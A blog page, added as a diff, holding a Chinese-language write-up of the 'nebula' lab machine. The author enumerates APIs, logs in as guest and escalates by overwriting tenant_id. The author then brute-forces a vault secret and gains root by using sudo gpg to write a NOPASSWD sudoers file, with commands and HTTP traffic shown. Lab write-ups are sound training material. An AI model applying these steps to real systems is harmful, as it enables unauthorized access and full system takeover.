@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>nebula靶机-wp | Blue Star's Blog</title><meta name="author" content="Neuroblue"><meta name="copyright" content="Neuroblue"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="来源:dashazi 打点扫描IP全端口nmap -sT –min-rate&#x3D;10000 -p- $IP -o nmap1 开放22805000 访问 web 80,5000 80端口三板斧看一眼 title Nebula Sentinel - 企业密钥管理平台无fivicon 后台跑 whatweb、nikto 识别服务 12whatweb -v http:&#x2F;&#x2F;192.168.124.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nebula靶机-wp">
+<meta property="og:url" content="https://bluestar-34.github.io/2026/01/24/nebula%E9%9D%B6%E6%9C%BA-wp/index.html">
+<meta property="og:site_name" content="Blue Star&#39;s Blog">
+<meta property="og:description" content="来源:dashazi 打点扫描IP全端口nmap -sT –min-rate&#x3D;10000 -p- $IP -o nmap1 开放22805000 访问 web 80,5000 80端口三板斧看一眼 title Nebula Sentinel - 企业密钥管理平台无fivicon 后台跑 whatweb、nikto 识别服务 12whatweb -v http:&#x2F;&#x2F;192.168.124.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bluestar-34.github.io/img/5.jpg">
+<meta property="article:published_time" content="2026-01-24T13:36:48.000Z">
+<meta property="article:modified_time" content="2026-01-24T13:42:28.034Z">
+<meta property="article:author" content="Neuroblue">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bluestar-34.github.io/img/5.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "nebula靶机-wp",
+  "url": "https://bluestar-34.github.io/2026/01/24/nebula%E9%9D%B6%E6%9C%BA-wp/",
+  "image": "https://bluestar-34.github.io/img/5.jpg",
+  "datePublished": "2026-01-24T13:36:48.000Z",
+  "dateModified": "2026-01-24T13:42:28.034Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Neuroblue",
+      "url": "https://bluestar-34.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/B.png"><link rel="canonical" href="https://bluestar-34.github.io/2026/01/24/nebula%E9%9D%B6%E6%9C%BA-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'nebula靶机-wp',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/linux.png);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/aniya_kan.png" alt="Logo"><span class="site-name">Blue Star's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">nebula靶机-wp</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">nebula靶机-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-24T13:36:48.000Z" title="Created 2026-01-24 21:36:48">2026-01-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-24T13:42:28.034Z" title="Updated 2026-01-24 21:42:28">2026-01-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>来源:dashazi</p>
+<h1 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h1><p>扫描IP全端口<br>nmap -sT –min-rate&#x3D;10000 -p- $IP -o nmap1</p>
+<p>开放<br>22<br>80<br>5000</p>
+<p>访问 web 80,5000<br><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214039576.png" alt="Pasted image 20260121141908"></p>
+<p>80端口三板斧<br>看一眼 title Nebula Sentinel - 企业密钥管理平台<br>无fivicon</p>
+<p>后台跑 whatweb、nikto 识别服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://192.168.124.14</span><br><span class="line">nikto -h http://192.168.124.14</span><br></pre></td></tr></table></figure>
+
+<p>目录爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http://192.168.124.14 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt,js,bak,old -t 30</span><br></pre></td></tr></table></figure>
+
+<p>5000 端口查看源码得到 api 接口信息<br><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214106649.png" alt="Pasted image 20260121142142"></p>
+<p>爆破 api 接口得到 login</p>
+<p>测试字段，根据返回包信息给出 json 格式数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214111777.png" alt="Pasted image 20260121142229"><br>爆破不出账户密码<br>卡主</p>
+<p>然后思考了一下，看到 Legacy API versions: &#x2F;api&#x2F;v1&#x2F;，这个 legacy 代表遗留的</p>
+<p>所以 api 接口可能有其他的，比如 v2 (真的有)</p>
+<p>扫一下<br><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214113229.png" alt="Pasted image 20260121143620"><br>路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">health</span><br><span class="line">login</span><br><span class="line">stats</span><br><span class="line">users</span><br></pre></td></tr></table></figure>
+
+<p>尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v2/users HTTP/1.1</span><br><span class="line">Host: 192.168.124.14:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 401 UNAUTHORIZED</span><br><span class="line">Server: Werkzeug/3.1.4 Python/3.9.2</span><br><span class="line">Date: Wed, 21 Jan 2026 06:37:50 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">X-Sentinel-Debug: None</span><br><span class="line">Server: NebulaSentinel/2.5.1</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 85</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;:&quot;Unauthorized&quot;,&quot;hint&quot;:&quot;Authorization header with Bearer token is required&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>health</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿NeuroLap)-[/mnt/c/Users/asus]</span><br><span class="line">└─# for ep in health stats; do   curl -s -X GET http://192.168.124.14:5000/api/v2/$ep | jq .; done</span><br><span class="line">&#123;</span><br><span class="line">  &quot;status&quot;: &quot;healthy&quot;,</span><br><span class="line">  &quot;timestamp&quot;: &quot;2026-01-21T06:46:45.070490&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;2.5.1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我尝试伪造添加 Authorization header，但是失败<br>卡住</p>
+<p>大字典重新扫描 &#x2F; , &#x2F;api , &#x2F;api&#x2F;v2<br>新发现  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">405      GET        5l       20w      153c http://192.168.124.14:5000/api/v2/vault</span><br></pre></td></tr></table></figure>
+<p>访问，仍然返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;:&quot;Unauthorized&quot;,&quot;hint&quot;:&quot;Authorization header with Bearer token is required&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>v2 接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">health</span><br><span class="line">login</span><br><span class="line">stats</span><br><span class="line">users</span><br><span class="line">vault</span><br></pre></td></tr></table></figure>
+
+<p>递归扫描 &#x2F;api&#x2F;v2&#x2F;users&#x2F; , &#x2F;api&#x2F;v2&#x2F;vault</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214118390.png" alt="Pasted image 20260124200853"></p>
+<p>得到路由<br>&#x2F;api&#x2F;v2&#x2F;users&#x2F;list<br>&#x2F;api&#x2F;v2&#x2F;vault&#x2F;query</p>
+<p>根据返回包修改请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v2/users/list HTTP/1.1</span><br><span class="line">Host: 192.168.124.14:5000</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 20</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>得到用户数据</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">,</span><span class="attr">&quot;users&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="string">&quot;IT Security&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tenant_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;system&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span><span class="string">&quot;manager&quot;</span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="string">&quot;Finance&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tenant_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;finance&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdoe&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span><span class="string">&quot;user&quot;</span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="string">&quot;Human Resources&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tenant_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;hr&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;asmith&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span><span class="string">&quot;user&quot;</span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="string">&quot;DevOps&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tenant_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;engineering&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;mlee&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span><span class="string">&quot;guest&quot;</span><span class="punctuation">,</span><span class="attr">&quot;department&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;tenant_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;public&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;guest&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>注意有个 guest 用户，直接尝试使用 guest:guest 在 login 接口处登录<br>返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;access_level&quot;:&quot;guest&quot;,&quot;department&quot;:null,&quot;message&quot;:&quot;Login successful&quot;,&quot;tenant_id&quot;:&quot;public&quot;,&quot;token&quot;:&quot;a4df4855ecf855e12ee5045388c72fbe1aa49dda4eaca3a82c200eb8946ceb33&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>拿到数据后手动添加请求头<br>Authorization: Bearer b43f682c3f963a144154d65b7cde17b078c24ecc3695fdb71407db82a6f846b5</p>
+<p>接着继续使用 query 查询<br>提示确实 key  value 信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;:&quot;Missing required parameters&quot;,&quot;missing&quot;:[&quot;key&quot;,&quot;value&quot;],&quot;required&quot;:[&quot;key&quot;,&quot;value&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意官网主界面</p>
+<p>system:secure_vault_key:平台核心主加密密钥，用于内部服务间敏感数据加密、签名验证及安全会话保护。属于最高机密等级，仅系统管理员可访问。</p>
+<p>这个 key 应该就是 secure_vault_key，而 value 就是我们要寻找的值<br>然后不断测试请求格式<br><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214121743.png" alt="Pasted image 20260124202132"><br><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214140167.png" alt="Pasted image 20260124202252"></p>
+<p>现在只需要爆破 value 值即可得到秘钥信息<br>经测试，一个也爆破不出。可能原因是这里是 system 权限的接口，而我们是 guest<br>所有在 users 处尝试越权</p>
+<p>根据之前登录获取的信息 “tenant_id”:”public”，我们将其修改为 “tenant_id”:”system” ，看能不能将后端数据覆盖<br><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214123643.png" alt="Pasted image 20260124203629"><br>可以看到在 &#x2F;users 下直接修改成功，此时我们 token 已经相当于 system 权限<br>开始爆破 value 值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Bluestar-34/picx-images-hosting/img/20260124214124917.png" alt="Pasted image 20260124203913"></p>
+<p>bmVidWxhOk4zYnVsQEFkbTFuMjAyNSE</p>
+<p>&#x3D;》<br>nebula:N3bul@Adm1n2025!</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>家目录下有一个 hint.gpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nebula@nebula:~/.password-store$ file hint.gpg </span><br><span class="line">hint.gpg: PGP RSA encrypted session key - keyid: 5D4EAE19 BCED18C5 RSA (Encrypt or Sign) 2048b .</span><br></pre></td></tr></table></figure>
+
+<p>解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nebula@nebula:~/.password-store$ gpg -d hint.gpg</span><br><span class="line">gpg: encrypted with 2048-bit RSA key, ID 19AE4E5DC518EDBC, created 2025-12-29</span><br><span class="line">      &quot;Nebula User &lt;nebula@nebula-sentinel.local&gt;&quot;</span><br><span class="line">postfix</span><br></pre></td></tr></table></figure>
+
+<p>解密成功：hint.gpg 里只有一行明文<br><code>postfix</code><br>说明下一步线索跟邮件服务器 postfix 有关——去查它的配置、日志或相关密码条目</p>
+<p>&#x2F;var&#x2F;mail 里面没有线索</p>
+<p>在 opt 里找到可疑文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nebula@nebula:/opt/vault-maintenance$ cat backup.sh </span><br></pre></td></tr></table></figure>
+
+<p>忽略 …</p>
+<p>sudo -l</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) PASSWD: /usr/bin/gpg </span><br></pre></td></tr></table></figure>
+
+<p>使用 gpg 加密然后解密到指定地方就可以实现任意文件写入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;simho ALL=(ALL) NOPASSWD: ALL&quot; &gt; /tmp/pwn</span><br><span class="line"></span><br><span class="line">/usr/bin/gpg --batch --yes --pinentry-mode loopback --passphrase &quot;123&quot; -c /tmp/pwn</span><br><span class="line"></span><br><span class="line">sudo /usr/bin/gpg --batch --yes --pinentry-mode loopback -- passphrase &quot;123&quot; -o /etc/sudoers.d/simho -d /tmp/pwn.gpg </span><br></pre></td></tr></table></figure>
+
+<p>拿到 root shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">simho@nebula:~$ sudo -l</span><br><span class="line">Matching Defaults entries for simho on nebula:</span><br><span class="line">env_reset, mail_badpass,</span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line">User simho may run the following commands on nebula:</span><br><span class="line">(ALL) PASSWD: /usr/bin/gpg</span><br><span class="line">(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>API 接口的递归扫描与测试<br>gpg解密<br>gpg写入 sudoers 提权</p>
+<h2 id="gpg"><a href="#gpg" class="headerlink" title="gpg"></a>gpg</h2><p>GPG &#x3D; 用“公钥锁、私钥开”的工具，先把随机会话密钥用 RSA&#x2F;ECC 加密，再用 AES 加密正文；还能签名、吊销、建信任链。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://bluestar-34.github.io">Neuroblue</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://bluestar-34.github.io/2026/01/24/nebula%E9%9D%B6%E6%9C%BA-wp/">https://bluestar-34.github.io/2026/01/24/nebula%E9%9D%B6%E6%9C%BA-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/24/unsafeAI%E9%9D%B6%E6%9C%BA-WP/" title="unsafeAI靶机-WP"><img class="cover" src="/img/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">unsafeAI靶机-WP</div></div><div class="info-2"><div class="info-item-1">靶机：192.168.124.21 nmap四板斧 存活探测 1nmap -sn 192.168.1.0/24      // no port scan  初步端口扫描 12export IP=192.168.124.21nmap -sT -p- --min-rate=10000 $IP -o nmap1  存活端口细致扫描 12ports=$(grep open nmap1 | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;)nmap -sT -sV -sC -O -p$ports $IP -oA nmap2  udp扫描 1nmap -sU --top-ports $IP  打点22，80端口开放 目录扫描 1234567[14:19:19] Starting: [14:19:26] 200 -    7KB - /admin[14:19:35] 200 -    4KB - /contact[14:19:46] 302 -  189B  - /logout ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Neuroblue</div><div class="author-info-description">BBBBBBBlue.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bluestar-34/Bluestar-34.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a lonely blue star.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gpg"><span class="toc-number">3.1.</span> <span class="toc-text">gpg</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/nebula%E9%9D%B6%E6%9C%BA-wp/" title="nebula靶机-wp"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nebula靶机-wp"/></a><div class="content"><a class="title" href="/2026/01/24/nebula%E9%9D%B6%E6%9C%BA-wp/" title="nebula靶机-wp">nebula靶机-wp</a><time datetime="2026-01-24T13:36:48.000Z" title="Created 2026-01-24 21:36:48">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/unsafeAI%E9%9D%B6%E6%9C%BA-WP/" title="unsafeAI靶机-WP"><img 